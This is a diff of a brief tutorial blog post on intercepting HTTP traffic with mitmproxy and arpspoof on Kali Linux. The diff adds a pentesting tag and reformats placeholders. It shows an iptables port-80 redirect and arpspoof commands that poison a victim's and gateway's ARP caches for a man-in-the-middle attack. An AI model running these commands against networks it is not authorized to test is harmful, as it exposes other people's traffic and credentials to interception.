@@ -1,7 +1,7 @@
 ---
 layout: post
 title: "Intercept HTTP Traffic with Mitmproxy and Arpspoof on Kali Linux"
-tags: [mitmproxy, arp, kali, linux, network]
+tags: [mitmproxy, arp, kali, linux, network, pentesting]
 ---
 
 1. Enable IP forwarding & port redirection
@@ -12,10 +12,10 @@ iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 80
 
 2. Use `tmux` to run 2 instances of `arpspoof`:
 ```bash
-arpspoof -i $INTERFACE -t $VICTIM_IP $GATEWAY_IP
+arpspoof -i <$INTERFACE> -t <$VICTIM_IP> <$GATEWAY_IP>
 ```
 ```bash
-arpspoof -i $INTERFACE -t $GATEWAY_IP $VICTIM_IP
+arpspoof -i <$INTERFACE> -t <$GATEWAY_IP> <$VICTIM_IP>
 ```
 
 3. Run `mitmproxy` in transparent mode:
